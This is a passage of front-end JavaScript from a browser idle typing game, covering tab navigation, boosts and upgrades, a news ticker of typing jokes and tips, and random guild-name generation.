        const sign = number < 0 ? -1 : 1;         // Preserve the sign
        const absVal = Math.abs(number);
        
        const suffixes = [
            '', 'k', 'million', 'billion', 'trillion', 'quadrillion', 'quintillion',
            'sextillion', 'septillion', 'octillion', 'nonillion', 'decillion',
            'undecillion', 'duodecillion', 'tredecillion', 'quattuordecillion',
            'quindecillion', 'sexdecillion', 'septendecillion', 'octodecillion',
            'novemdecillion', 'vigintillion'
        ];
        
        // Determine the tier (1000^tier) based on absolute value.
        const tier = Math.floor(Math.log10(absVal) / 3);
        
        // For numbers below 1000 in absolute value, just return them as is.
        if (tier === 0 || absVal < 1000) return (sign * absVal).toFixed(2);
        
        // Scale the absolute value down to its tier, then reapply the sign.
        const scaled = sign * (absVal / Math.pow(10, tier * 3));
        const suffix = suffixes[tier] || `e${tier * 3}`;
        
        return `${scaled.toFixed(2)} ${suffix}`;
    }
    
    
    function switchTab(activeTab, pushState = true) {
        if(casinoBusy) return; // Prevent switching tabs while casino is busy as it will break the casino
        currentPage = activeTab.id;
        for (const key in tabs) {
            if (tabs[key].tab === activeTab) {
                tabs[key].page.style.display = "block";
                tabs[key].tab.classList.add("active");
            } else {
                tabs[key].page.style.display = "none";
                tabs[key].tab.classList.remove("active");
            }
        }
        document.body.className = `${currentTheme} ${currentPage}`;
        if(currentPage === 'main-tab') {
            document.getElementById('input-box').focus();
        }
        window.scrollTo(0, 0);
        playMenuSound();
        gtag('event', 'switch_tab', {
            'active_tab': currentPage,
            'event_category': 'navigation'
        });
        
        if (pushState) {
            const url = new URL(window.location);
            url.pathname = `/${currentPage}`;
            history.pushState({ tab: currentPage }, '', url);
        }
    }
    
    window.addEventListener('popstate', (event) => {
        if (event.state && event.state.tab) {
            const tabToActivate = document.getElementById(event.state.tab);
            if (tabToActivate) {
                switchTab(tabToActivate, false);
            }
        }
    });
    
    function applyTheme() {
        document.body.className = `${currentTheme} ${currentPage}`;
        gtag('event', 'apply_theme', {
            'active_theme': currentTheme,
            'event_category': 'settings'
        });
    }
    function sendHeartbeat() {
        if(window.location.host !== 'www.typeidle.com' && window.location.host !== 'typeidle.com') return; // Don't send heartbeats in development
        fetch('heartbeat.php', {
            method: 'POST',
            credentials: 'same-origin'
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.text();
        })
        .then(data => {
            console.log('Heartbeat sent successfully:', data);
        })
        .catch(error => {
            console.error('There was a problem with the heartbeat request:', error);
        });
    }
    
    function cheat_code() {
        let gain = buildings[buildings.length - 1].baseCost;
        keystrokesBank += gain;
        totalKeystrokes += gain;
        createFloatingWord(`Cheat Code: +${formatShortScale(gain)}`);
    }
      function displayModules() {
        displayWordle();
        displayBuildings();
        displayUpgrades();
        displayReports();
        displayArena();
        displayStockMarket();
        displayNews();
        displayBuffs();
        displayGuild();
        displayHacker();
        displayArcade();
        displayCasino();
        displayMemory();
        
        // Initialize buildings panel
        initializeBuildingsPanel();
    }
// Buildings Panel Mobile Toggle Functionality
function initializeBuildingsPanel() {
    const toggleBtn = document.getElementById('buildings-toggle-btn');
    const buildingsPanel = document.getElementById('buildings-panel');
    const panelContent = document.getElementById('buildings-panel-content');
    const closeBtn = document.getElementById('buildings-panel-close');
    
    if (toggleBtn && buildingsPanel) {
        // Toggle panel visibility on mobile
        toggleBtn.addEventListener('click', function() {
            buildingsPanel.classList.toggle('active');
        });
        
        // Close panel when clicking close button
        if (closeBtn) {
            closeBtn.addEventListener('click', function() {
                buildingsPanel.classList.remove('active');
            });
        }
        
        // Close panel when clicking outside on mobile
        buildingsPanel.addEventListener('click', function(e) {
            if (e.target === buildingsPanel) {
                buildingsPanel.classList.remove('active');
            }
        });
        
        // Close panel on escape key
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape' && buildingsPanel.classList.contains('active')) {
                buildingsPanel.classList.remove('active');
            }
        });
        
        // Handle window resize
        window.addEventListener('resize', function() {
            if (window.innerWidth > 1024) {
                buildingsPanel.classList.remove('active');
            }
        });
    }
}

initializeBuildingsPanel();
// initially empty list
let modifiers = [
    /*
    // Example modifier:
    {
    name: "Mechanical Keyboards",
    description: "Doubles production from Auto Writers.",
    affectedBuildings: [1],
    multiplier: 2
    }
    */
];

let boosts = [
    {
        id: 0,
        name: "Wordle Boost",
        description: "Doubles production from Auto Writers and manually typed words.",
        affectedBuildings: [0, AutoWriter.id], // 0 for manually typed words
        multiplier: 2,
        duration: Tickrate * 3 * 60,
        maxduration: Tickrate * 3 * 60,
        icon: "/images/boost/wordle.webp"
    },
    {
        id: 1,
        name: "Race Finish Buff",
        description: "Racing is disabled for 5 minutes.",
        affectedBuildings: [],
        multiplier: 1,
        duration: Tickrate * 5 * 60,
        maxduration: Tickrate * 5 * 60,
        hidden: true,
    },
    {
        id: 2,
        name: "Champion of the Arena",
        description: "Manual keystrokes boosted by 1% of passive income.",
        affectedBuildings: [0, AutoWriter.id],
        multiplier: 2,
        KPStoManual: 0.01,
        duration: Tickrate * 5 * 60,
        maxduration: Tickrate * 5 * 60,
        icon: "/images/boost/arena.webp"
    },
    {
        id: 3,
        name: "Golden News Boost",
        description: "7x passive income boost",
        duration: 60 * Tickrate, // 1 minute boost,
        maxduration: 60 * Tickrate,
        multiplier: 7,
        affectedBuildings: buildings.flatMap(b => b.id),
        icon: "/images/boost/news.webp"
    },
    {
        id: 4,
        name: "Golden News Boost",
        description: "7x production from manual keystrokes",
        duration: 60 * Tickrate, // 1 minute boost
        maxduration: 60 * Tickrate,
        multiplier: 7,
        affectedBuildings: [0], // 0 for manually typed keystrokes,
        icon: "/images/boost/news.webp"
    },
    {
        id: 5,
        name: "Guild task change cooldown",
        description: "Changing guild tasks is disabled for 5 minutes.",
        duration: 5 * 60 * Tickrate,
        maxduration: 5 * 60 * Tickrate,
        hidden: true,
    },
    {
        id: 6,
        name: "Hacker cooldown", // Hacker lost hijack cooldown
        description: "Hacking minigame is on cooldown.",
        duration: 0.1 * 60 * Tickrate,
        maxduration: 0.1 * 60 * Tickrate,
        hidden: true,
    },
    {
        id: 7,
        name: "Arcade cooldown",
        description: "Arcade minigame is on cooldown.",
        duration: 0.1 * 60 * Tickrate,
        maxduration: 0.1 * 60 * Tickrate,
        hidden: true,
    },
    {
        id: 9,
        name: "Memory cooldown",
        description: "Memory minigame is on cooldown.",
        duration: 0.1 * 60 * Tickrate,
        maxduration: 0.1 * 60 * Tickrate,
        hidden: true,
    },
    {
        id: 10,
        name: "Hacker cooldown", // Hacker won cooldown
        description: "Hacking minigame is on cooldown.",
        duration: 0.1 * 60 * Tickrate,
        maxduration: 0.1 * 60 * Tickrate,
    },
    {
        id: 11,
        name: "Hacker cooldown", // Hacker lost crack cooldown
        description: "Hacking minigame is on cooldown.",
        duration: 0.1 * 60 * Tickrate,
        maxduration: 0.1 * 60 * Tickrate,
        hidden: true
    }
]

function spawnBoost(id, duration) {
    const boost = boosts.find(b => b.id === id);
    if (boost) {
        const newModifier = { ...boost, duration: duration || boost.duration, boostID: id };
        modifiers.push(newModifier);
    }
}

let autowriterBoostApplied = false;
let printerBoostApplied = false;
let serverBoostApplied = false;
let trophyBoostApplied = false;

function checkModifiers() {
    // check modifiers with duration and remove expired ones
    for (let i = modifiers.length - 1; i >= 0; i--) {
        const modifier = modifiers[i];
        if (modifier.hasOwnProperty("duration")) {
            modifier.duration -= 1; // Reduce duration by 1 tick
            if (modifier.duration <= 0) {
                modifiers.splice(i, 1); // Remove the modifier if duration is 0
                //showNotification(`<p><strong>Modifier Expired:</strong> ${modifier.name}</p>`);
            }
        }
    }
    // check modifiers that unlock with buildings
    if(AutoWriter.level > 0 && !autowriterBoostApplied) {
        autowriterBoostApplied = true;
        modifiers.push({
            name: "Auto Writer Boost",
            description: "Each Auto Writer increases manually typed words production by 5%.",
            affectedBuildings: [0], // 0 for manually typed words
            getMultiplier: () => 1 + AutoWriter.level * 0.05, // Dynamic multiplier
        });
    }
    
    if(Printer.level > 0 && !printerBoostApplied) {
        printerBoostApplied = true;
        modifiers.push({
            name: "Printer Boost",
            description: "Each Printer increases passive income by 0.75%.",
            affectedBuildings: buildings.flatMap(b => b.id), // IDs of all buildings contributing to passive income
            getMultiplier: () => 1 + Printer.level * 0.0075, // Dynamic multiplier
        });
    }
    
    
    if(ServerFarm.level > 0 && !serverBoostApplied) {
        serverBoostApplied = true;
        modifiers.push({
            name: "Server Boost",
            description: "Each Server Farm adds 0.1% of passive income to manual keystrokes.",
            affectedBuildings: [0], // 0 for manually typed words
            getKPStoManual: () => ServerFarm.level * 0.001, // Dynamic multiplier
        });
    }
    
    
    if(TypingArena.level > 0 && !trophyBoostApplied) {
        trophyBoostApplied = true;
        modifiers.push({
            name: "Trophy Boost",
            description: "",
            affectedBuildings: [TypingArena.id],
            getMultiplier: () => 1 + arenaGoldMedals * 0.025, 
        });
    }
}

modifiers.push({
    name: "WPM Boost",
    description: "Every 30 WPM increases manual keystrokes production by 100%.",
    affectedBuildings: [0, ...buildings.flatMap(b => b.id)], // 0 for manually typed words
    getMultiplier: () => 1 + wpm / 30,
});

const upgrades = [
    {
        id: 1,
        name: "Mechanical Keyboards",
        description: "Doubles production from Auto Writers and manually typed words.",
        trivia: "Mechanical keyboards are known for their tactile feedback and durability.",
        emoji: "⌨️",
        cost: 100,
        unlocked: false,
        visible: false,
        visibleCondition: () => AutoWriter.level > 0,
        effect: () => {
            modifiers.push({
                name: "Mechanical Keyboards",
                description: "Doubles production from Auto Writers and manually typed words.",
                affectedBuildings: [0, AutoWriter.id], // 0 for manually typed words
                multiplier: 2
            });
        },
    },
    {
        id: 2,
        name: "Color Printer",
        description: "Doubles production from Printers.",
        trivia: "Color printers use a combination of four colors to produce a wide range of colors.",
        emoji: "🖨️",
        cost: 200,
        unlocked: false,
        visible: false,
        visibleCondition: () => Printer.level > 0,
        effect: () => {
            modifiers.push({
                name: "Color Printer",
                description: "Doubles production from Printers.",
                affectedBuildings: [Printer.id],
                multiplier: 2
            });
        },
    },
    {
        id: 3,
        name: "RGB Keyboards",
        description: "Doubles production from Auto Writers and manually typed words.",
        trivia: "RGB keyboards makes typing in the dark easier.",
        emoji: "🌈",
        cost: 100,
        unlocked: false,
        visible: false,
        visibleCondition: () => isUpgradeUnlocked(1), // Visible after Mechanical Keyboards is unlocked
        effect: () => {
            modifiers.push({
                name: "RGB Keyboards",
                description: "Doubles production from Auto Writers and manually typed words.",
                affectedBuildings: [0, AutoWriter.id], // 0 for manually typed words
                multiplier: 2
            });
        },
    },
    {
        id: 4,
        name: "Laser Printer",
        description: "Doubles production from Printers.",
        trivia: "Laser printers use a laser to produce high-quality prints.",
        emoji: "🔥",
        cost: 500,
        unlocked: false,
        visible: false,
        visibleCondition: () => isUpgradeUnlocked(2), // Visible after Color Printer is unlocked
        effect: () => {
            modifiers.push({
                name: "Laser Printer",
                description: "Doubles production from Printers.",
                affectedBuildings: [Printer.id],
                multiplier: 2
            });
        },
    },
    {
        id: 5,
        name: "Quantum Keyboards",
        description: "Doubles production from Auto Writers and manually typed words.",
        trivia: "Keys may or may not be pressed at the same time.",
        emoji: "⚛️",
        cost: 1000,
        unlocked: false,
        visible: false,
        visibleCondition: () => isUpgradeUnlocked(3), // Visible after RGB Keyboards is unlocked
        effect: () => {
            modifiers.push({
                name: "Quantum Keyboards",
                description: "Doubles production from Auto Writers and manually typed words.",
                affectedBuildings: [0, AutoWriter.id], // 0 for manually typed words
                multiplier: 2
            });
        },
    },
    {
        id: 6,
        name: "3D Printer",
        description: "Triples production from Printers.",
        trivia: "3D printers can create three-dimensional objects from digital models.",
        emoji: "🎯",
        cost: 2000,
        unlocked: false,
        visible: false,
        visibleCondition: () => isUpgradeUnlocked(4), // Visible after Laser Printer is unlocked
        effect: () => {
            modifiers.push({
                name: "3D Printer",
                description: "Triples production from Printers.",
                affectedBuildings: [Printer.id],
                multiplier: 3
            });
        },
    },
    {
        id: 7,
        name: "Quantum Printers",
        description: "Doubles production from Printers.",
        trivia: "Quantum printers don't require ink or toner.",
        emoji: "🌀",
        cost: 2500,
        unlocked: false,
        visible: false,
        visibleCondition: () => isUpgradeUnlocked(6), // Visible after 3D Printer is unlocked
        effect: () => {
            modifiers.push({
                name: "Quantum Printers",
                description: "Doubles production from Printers.",
                affectedBuildings: [Printer.id],
                multiplier: 2
            });
        },
    },
    {
        id: 8,
        name: "AI Typing Assistants",
        description: "Triples production from manually typed words.",
        trivia: "Just like a real assistant, but without the coffee breaks.",
        emoji: "🤖",
        cost: 5000,
        unlocked: false,
        visible: false,
        visibleCondition: () => isUpgradeUnlocked(5), // Visible after Quantum Keyboards is unlocked
        effect: () => {
            modifiers.push({
                name: "AI Typing Assistants",
                description: "Triples production from manually typed words.",
                affectedBuildings: [0], // 0 for manually typed words
                multiplier: 3
            });
        },
    },
    {
        id: 9,
        name: "Advanced research labs",
        description: "Triples production and research from research labs.",
        trivia: "Lab with more beakers.",
        emoji: "🧪",
        cost: 3400,
        unlocked: false,
        visible: false,
        visibleCondition: () => ResearchLab.level > 0,
        effect: () => {
            modifiers.push({
                name: "Advanced research labs",
                description: "Triples production and research from research labs.",
                affectedBuildings: [ResearchLab.id],
                multiplier: 3,
                researchMultiplier: 3
            });
        },
    },
    {
        id: 10,
        name: "24/7 Cyber Cafes",
        description: "Triples production from Cyber Cafes.",
        trivia: "Cyber Cafes are always open.",
        emoji: "🌙",
        cost: 5000,
        unlocked: false,
        visible: false,
        visibleCondition: () => CyberCafe.level > 0,
        effect: () => {
            modifiers.push({
                name: "24/7 Cyber Cafes",
                description: "Triples production from Cyber Cafes.",
                affectedBuildings: [CyberCafe.id],
                multiplier: 3
            });
        },
    },
    {
        id: 11,
        name: "High-Pressure Espresso Machines",
        description: "Doubles production from Cyber Cafes with a concentrated flow of caffeine.",
        trivia: "When the shots are strong, customers type faster!",
        emoji: "💨",
        cost: 5000,
        unlocked: false,
        visible: false,
        visibleCondition: () => isUpgradeUnlocked(10), // Visible after 24/7 Cyber Cafes is unlocked
        effect: () => {
            modifiers.push({
                name: "High-Pressure Espresso Machines",
                description: "Doubles production from Cyber Cafes.",
                affectedBuildings: [CyberCafe.id],
                multiplier: 2
            });
        },
    },
    {
        id: 12,
        name: "Gourmet Coffee Selection",
        description: "Doubles production from Cyber Cafes with a refined range of coffee blends.",
        trivia: "From Americano to Macchiato, premium flavors keep visitors typing away!",
        emoji: "☕",
        cost: 5000,
        unlocked: false,
        visible: false,
        visibleCondition: () => isUpgradeUnlocked(11), // Visible after High-Pressure Espresso Machines is unlocked
        effect: () => {
            modifiers.push({
                name: "Gourmet Coffee Selection",
                description: "Doubles production from Cyber Cafes.",
                affectedBuildings: [CyberCafe.id],
                multiplier: 2
            });
        },
    },
    {
        id: 13,
        name: "Artisanal Latte Workshop",
        description: "Triples production from Cyber Cafes by perfecting the latte art craft.",
        trivia: "When the latte looks stunning, customers stay longer and type more!",
        emoji: "🎨",
        cost: 10000,
        unlocked: false,
        visible: false,
        visibleCondition: () => isUpgradeUnlocked(12), // Visible after Gourmet Coffee Selection is unlocked
        effect: () => {
            modifiers.push({
                name: "Artisanal Latte Workshop",
                description: "Triples production from Cyber Cafes.",
                affectedBuildings: [CyberCafe.id],
                multiplier: 3
            });
        },
    },
    {
        id: 14,
        name: "Cloud Servers",
        description: "Doubles production from Server Farms.",
        trivia: "Cloud servers are virtual servers running in a cloud computing environment.",
        emoji: "☁️",
        cost: 10000,
        unlocked: false,
        visible: false,
        visibleCondition: () => ServerFarm.level > 0,
        effect: () => {
            modifiers.push({
                name: "Cloud Servers",
                description: "Doubles production from Server Farms.",
                affectedBuildings: [ServerFarm.id],
                multiplier: 2
            });
        },
    },
    {
        id: 15,
        name: "Quantum Servers",
        description: "Doubles production from Server Farms.",
        trivia: "Qubits may or may not be in a superposition.",
        emoji: "🔮",
        cost: 15000,
        unlocked: false,
        visible: false,
        visibleCondition: () => isUpgradeUnlocked(14), // Visible after Cloud Servers is unlocked
        effect: () => {
            modifiers.push({
                name: "Quantum Servers",
                description: "Doubles production from Server Farms.",
                affectedBuildings: [ServerFarm.id],
                multiplier: 2
            });
        },
    },
    {
        id: 16,
        name: "Yearly Typing Championships",
        description: "Triples production from Typing Arenas.",
        trivia: "Typing champions are crowned every year.",
        emoji: "🏆",
        cost: 20000,
        unlocked: false,
        visible: false,
        visibleCondition: () => TypingArena.level > 0,
        effect: () => {
            modifiers.push({
                name: "Yearly Typing Championships",
                description: "Triples production from Typing Arenas.",
                affectedBuildings: [TypingArena.id],
                multiplier: 3
            });
        },
    },
    {
        id: 17,
        name: "Advanced IT Support",
        description: "Triples production from IT Offices.",
        trivia: "IT support that never sleeps, takes holidays or calls in sick.",
        emoji: "🛠️",
        cost: 30000,
        unlocked: false,
        visible: false,
        visibleCondition: () => ITOffice.level > 0,
        effect: () => {
            modifiers.push({
                name: "Advanced IT Support",
                description: "Triples production from IT Offices.",
                affectedBuildings: [ITOffice.id],
                multiplier: 3
            });
        },
    },
    {
        id: 18,
        name: "Advanced Stock Trading Algorithms",
        description: "Doubles production from Stock Market.",
        trivia: "Algorithms that predict market trends with high accuracy.",
        emoji: "📈",
        cost: 40000,
        unlocked: false,
        visible: false,
        visibleCondition: () => StockMarket.level > 0,
        effect: () => {
            modifiers.push({
                name: "Advanced Stock Trading Algorithms",
                description: "Doubles production from Stock Market.",
                affectedBuildings: [StockMarket.id],
                multiplier: 2
            });
        },
    },
    {
        id: 19,
        name: "Elite Typing Guild",
        description: "Doubles production from Typing Guild.",
        trivia: "Only the best typists are allowed in the elite guild.",
        emoji: "⚔️",
        cost: 50000,
        unlocked: false,
        visible: false,
        visibleCondition: () => TypingGuild.level > 0,
        effect: () => {
            modifiers.push({
                name: "Elite Typing Guild",
                description: "Doubles production from Typing Guild.",
                affectedBuildings: [TypingGuild.id],
                multiplier: 2
            });
        },
    }
];
function isUpgradeUnlocked(upgradeId) {
    const upgrade = upgrades.find(upg => upg.id === upgradeId);
    return upgrade ? upgrade.unlocked : false;
}

function initUpgrades() {
    const researchContainer = document.getElementById('research-container');
    const ownedResearchContainer = document.getElementById('owned-research-container');
    researchContainer.innerHTML = '';
    
    // Sort upgrades by cost in ascending order
    const sortedUpgrades = [...upgrades].sort((a, b) => a.cost - b.cost);    sortedUpgrades.forEach((upgrade, index) => {
        // Big buttons
        const researchElement = document.createElement('button');
        researchElement.style.backgroundImage = `url("/images/tooltips/upgrades/448/${upgrade.id}.jpg")`;
        researchElement.className = 'bigUpgrade';
        researchElement.setAttribute('data-index', upgrade.id - 1);
        researchElement.innerHTML = `
            <div class="upgrade-content">
                <div class="upgrade-emoji">${upgrade.emoji}</div>
                <div class="upgrade-info">
                    <div class="upgrade-name">${upgrade.name}</div>
                    <div class="upgrade-description">${upgrade.description}</div>
                    <div class="upgrade-cost">
                        <img src="/images/icons/128/research-bulb-icon.png" class="research-icon" alt="Research"> 
                        ${formatShortScale(upgrade.cost)}
                    </div>
                </div>
            </div>
        `;
        researchElement.disabled = upgrade.cost > totalResearchPoints || upgrade.unlocked;
        researchElement.addEventListener('click', () => {
            if (totalResearchPoints >= upgrade.cost && !upgrade.unlocked) {
                totalResearchPoints -= upgrade.cost;
                upgrade.unlocked = true;
                upgrade.effect();
                playBuySound();
            }
        });
        researchContainer.appendChild(researchElement);
        
        const researchOwnedElement = document.createElement('div');
        researchOwnedElement.className = 'owned-bigUpgrade';
        researchOwnedElement.setAttribute('data-index', upgrade.id - 1);
        researchOwnedElement.style.backgroundImage = `url("/images/tooltips/upgrades/448/${upgrade.id}.jpg")`;
        researchOwnedElement.innerHTML = `
            <div class="upgrade-content">
                <div class="upgrade-emoji">${upgrade.emoji}</div>
                <div class="upgrade-info">
                    <div class="upgrade-name">${upgrade.name}</div>
                    <div class="upgrade-description">${upgrade.description}</div>
                    <div class="upgrade-trivia">"${upgrade.trivia}"</div>
                </div>
            </div>
        `;
        researchOwnedElement.style.display = 'none'; // Initially hide owned upgrade element
        ownedResearchContainer.appendChild(researchOwnedElement);
    });
}



function displayUpgrades() {
    const researchContainer = document.getElementById('research-container');
    const ownedResearchContainer = document.getElementById('owned-research-container');
    

    upgrades.forEach((upgrade, upgradeIndex) => {
        const researchElement = researchContainer.querySelector(`.bigUpgrade[data-index="${upgradeIndex}"]`); // big upgrade
        const ownedResearchElement = ownedResearchContainer.querySelector(`.owned-bigUpgrade[data-index="${upgradeIndex}"]`); // big owned upgrade
        if(!upgrade.visible) {
            upgrade.visible = upgrade.visibleCondition();
        }
        
        if (upgrade.unlocked) {
            researchElement.style.display = 'none'; // Hide original button
            ownedResearchElement.style.display = 'block'; // Show owned upgrade element
        } else {
            if(upgrade.visible) {
                researchElement.style.display = 'block';
            } else {
                researchElement.style.display = 'none';
            }
            researchElement.disabled = upgrade.cost > totalResearchPoints || upgrade.unlocked;
        }
    });
}

function displayBuffs() {
    const buffsContainer = document.getElementById('buffs-container');
    reconstructBuffList();
    const buffs = modifiers.filter(mod => mod.duration && !mod.hidden);
    const buffElements = buffsContainer.querySelectorAll(".buff");
    buffElements.forEach((element, index) => {
        const buffRemaining = element.querySelector('.buffRemain');
        buffRemaining.style.top = `${100 - ((buffs[index].duration / buffs[index].maxduration) * 100)}%`
    });
}

function reconstructBuffList() {
    const buffsContainer = document.getElementById('buffs-container');
    const buffs = modifiers.filter(mod => mod.duration && !mod.hidden);
    if(buffsContainer.querySelectorAll(".buff").length === buffs.length) return;
    buffsContainer.innerHTML = '';
    buffs.forEach(buff => {
        const buffElement = document.createElement('div');
        buffElement.style.backgroundImage = `url("${buff.icon}")`
        buffElement.className = 'buff';
        
        const buffRemaining = document.createElement('div');
        buffRemaining.className = "buffRemain";
        buffElement.appendChild(buffRemaining);
        
        buffElement.addEventListener('mouseover', () => showBuffTooltip(buffElement, buff));
        buffElement.addEventListener('mouseout', () => hideTooltip());
        
        buffsContainer.appendChild(buffElement);
    });
}

let news = [
{
    text: "Scientists discover that typing faster actually burns more calories.",
    icon: "science"
},
{
    text: "Breaking News: Local man types so fast, his keyboard starts smoking.",
    icon: "breaking"
},
{
    text: "Study shows that typing with two fingers is 50% less efficient than using all ten.",
    icon: "study"
},
{
    text: "New trend: Typing races becoming the latest e-sport sensation.",
    icon: "trend"
},
{
    text: "Typing tip: Always keep your wrists straight to avoid carpal tunnel syndrome.",
    icon: "tip"
},
{
    text: "Fun Fact: The quick brown fox jumps over the lazy dog uses every letter in the English alphabet.",
    icon: "fact"
},
{
    text: "Breaking: Typing competitions now offering scholarships for the fastest typists.",
    icon: "breaking"
},
{
    text: "Did you know? The average person types between 38 and 40 words per minute.",
    icon: "fact"
},
{
    text: "Why don't keyboards ever sleep? Because they have two shifts.",
    icon: "joke"
},
{
    text: "Breaking News: New typing software claims to improve typing speed by 50%.",
    icon: "breaking"
},
{
    text: "Fun Fact: The word 'typewriter' can be typed using only the top row of a QWERTY keyboard.",
    icon: "fact"
},
{
    text: "Tip: Practice typing regularly to improve your speed and accuracy.",
    icon: "tip"
},
{
    text: "What do you call a computer that sings? A-Dell.",
    icon: "joke"
},
{
    text: "Study: Typing games can help improve your typing speed and accuracy.",
    icon: "study"
},
{
    text: "Tip: Maintain a proper posture to avoid strain while typing.",
    icon: "tip"
},
{
    text: "Why was the computer tired when it got home? It had a hard drive.",
    icon: "joke"
},
{
    text: "Fun Fact: The QWERTY keyboard layout was designed to prevent jamming on mechanical typewriters.",
    icon: "fact"
},
{
    text: "Tip: Take regular breaks to avoid fatigue while typing.",
    icon: "tip"
},
{
    text: "Why did the computer keep freezing? It left its Windows open.",
    icon: "joke"
},
{
    text: "Tip: Use a comfortable chair to maintain good posture while typing.",
    icon: "tip"
},
{
    text: "eBay is so useless. I tried to look up lighters and all they had was 13,749 matches.",
    icon: "joke"
},
{
    text: "Why don't programmers like nature? It has too many bugs.",
    icon: "joke"
},
{
    text: "Why do Java developers wear glasses? Because they don't C#.",
    icon: "joke"
},
{
    text: "Why do programmers prefer dark mode? Because light attracts bugs.",
    icon: "joke"
},
{
    text: "Why was the JavaScript developer sad? Because he didn't know how to 'null' his feelings.",
    icon: "joke"
},
]

const newsIcons = {
    breaking: "📰",
    tip: "💡",
    joke: "😄",
    fact: "🔍",
    study: "📚",
    trend: "📈",
    science: "🔬"
};

let newsInit = false;
function displayNews() {
    if (newsInit) return;
    if(MagazinePublisher.level == 0) return;
    newsInit = true;
    document.getElementById("news-container").style.display = "flex";
    setInterval(() => {
        showNews();
    }, 1000 * 20);
    showNews();
}

function showNews() {
    const newsElement = document.getElementById("news-container").querySelector('.news-item');
    const newsContainer = document.getElementById("news-container");
    const currentNews = newsElement?.querySelector('.news-text')?.innerText || '';
    const newsIndex = Math.floor(Math.random() * news.length);
    const newNews = news[newsIndex].text;
    const newsIcon = news[newsIndex].icon || "fact";
    const isGoldenNews = Math.random() < (0.1 * (currentGuildTask === "publishing" ? 2 : 1)); // 10% base chance for golden news

    if (currentNews !== newNews) {
        if (newsElement) {
            newsElement.style.animationName = 'scrollDown'; // Animate the old news out
        }

        setTimeout(() => {
            if (newsElement) {
                newsContainer.removeChild(newsElement); // Remove old news
            }
            // Add new news
            const newNewsItem = document.createElement('div');
            newNewsItem.className = 'news-item';
            newNewsItem.style.animationName = 'scrollUp';

            // Create the icon element
            const iconSpan = document.createElement('span');
            iconSpan.className = 'news-icon';
            iconSpan.textContent = newsIcons[newsIcon] || newsIcons.fact;
            
            // Create the text element
            const textSpan = document.createElement('span');
            textSpan.className = 'news-text';
            textSpan.innerText = newNews;

            // Add the icon and text to the news item
            newNewsItem.appendChild(iconSpan);
            newNewsItem.appendChild(textSpan);

            if (isGoldenNews) {
                textSpan.classList.add('golden-news');
                textSpan.addEventListener('click', () => {
                    if(textSpan.classList.contains('golden-news-clicked')) return;
                    playClickSound();
                    textSpan.classList.remove('golden-news');
                    textSpan.classList.add('golden-news-clicked');
                    applyGoldenNewsBoost();
                    goldNewsClicks++;
                    gtag('event', 'gold_news_click', {
                        'event_category': 'news',
                        'total_clicks': goldNewsClicks
                      });
                });
            }

            newsContainer.appendChild(newNewsItem);
        }, 1000);
    }
}

function applyGoldenNewsBoost() {
    const boostTypes = ['passive_boost', 'active_boost', 'keystrokes'];
    const boostType = boostTypes[Math.floor(Math.random() * boostTypes.length)];
    if (boostType === 'passive_boost') {
        spawnBoost(3);
        showNotification(`Golden News Boost`, '7x passive income for 1 minute!', 'url("/images/boost/news.webp")');
    } else if (boostType === 'active_boost') {
        spawnBoost(4);
        showNotification(`Golden News Boost`, '7x production from manual keystrokes', 'url("/images/boost/news.webp")');
    } else if (boostType === 'keystrokes') {
        // Grant instant keystrokes based on passive income
        const instantKeystrokes = getPassiveIncome() * 60 * 7; // 7 minute worth of passive income
        keystrokesBank += instantKeystrokes;
        showNotification(`Golden News Boost`, `+${formatShortScale(instantKeystrokes)} keystrokes!`, 'url("/images/boost/news.webp")');
    }
}

let guildInit = false;
let guildUIState = "";

function generateRandomGuildName() {
    // Arrays of prefixes, suffixes, and descriptors
    const prefixes = [
        "Iron", "Golden", "Crimson", "Shadow", "Emerald", "Azure", "Obsidian", "Silver", 
        "Frost", "Ember", "Phoenix", "Dragon", "Raven", "Mystic", "Noble", "Royal", 
        "Ancient", "Eternal", "Radiant", "Celestial", "Savage", "Valiant", "Arcane"
    ];

    const nouns = [
        "Hand", "Fist", "Blade", "Shield", "Crown", "Heart", "Legion", "Order", 
        "Guild", "Vanguard", "Company", "Warriors", "Knights", "Guardians", "Sentinels", 
        "Covenant", "Pact", "Alliance", "Brigade", "Squad", "Warband", "Syndicate"
    ];

    const descriptors = [
        "of the Dawn", "of Twilight", "of the Realm", "of Fortune", "of Glory", 
        "of Valor", "of Honor", "of the Moon", "of the Sun", "of Destiny", 
        "of Justice", "of Power", "of Wisdom", "of Vengeance", "of Freedom"
    ];

    // Guild naming patterns
    const patternTypes = [
        // Basic pattern: Prefix + Noun (Iron Hand)
        () => {
            return `${prefixes[Math.floor(Math.random() * prefixes.length)]} ${nouns[Math.floor(Math.random() * nouns.length)]}`;
        },
        // Expanded pattern: Prefix + Noun + Descriptor (Iron Hand of the Dawn)
        () => {
            return `${prefixes[Math.floor(Math.random() * prefixes.length)]} ${nouns[Math.floor(Math.random() * nouns.length)]} ${descriptors[Math.floor(Math.random() * descriptors.length)]}`;
        },
        // The + Adjective + Noun (The Golden Legion)
        () => {
            return `The ${prefixes[Math.floor(Math.random() * prefixes.length)]} ${nouns[Math.floor(Math.random() * nouns.length)]}`;
        },
        // Noun + of + Adjective (Order of Crimson)
        () => {
            return `${nouns[Math.floor(Math.random() * nouns.length)]} of ${prefixes[Math.floor(Math.random() * prefixes.length)]}`;
        }
    ];

    // Choose a random pattern and generate name
    const randomPattern = patternTypes[Math.floor(Math.random() * patternTypes.length)];
    return randomPattern();
}

function randomizeGuildName() {
    guildName = generateRandomGuildName();
    document.getElementById('guild-name').textContent = guildName;
    // Add animation effect for name change
    const nameElement = document.getElementById('guild-name');
    nameElement.classList.add('name-change-effect');
    setTimeout(() => nameElement.classList.remove('name-change-effect'), 1000);
}

function enableGuildNameEditing() {
    const guildNameElement = document.getElementById('guild-name');
    guildNameElement.contentEditable = true;
    guildNameElement.focus();
    guildNameElement.classList.add('editing');
    
    guildNameElement.addEventListener('blur', () => {
        guildNameElement.contentEditable = false;
        guildNameElement.classList.remove('editing');
        guildName = guildNameElement.textContent.trim();
        if (!guildName) {
            guildName = generateRandomGuildName();
            guildNameElement.textContent = guildName;
        }
    });
}

// Modify the displayGuild function to add a click event for editing
function displayGuild() {
    if (!guildInit) {
        if (TypingGuild.level == 0) return;
        if (guildName === '') {
            guildName = generateRandomGuildName();
        }
        const guildNameElement = document.getElementById('guild-name');
        guildNameElement.textContent = guildName;
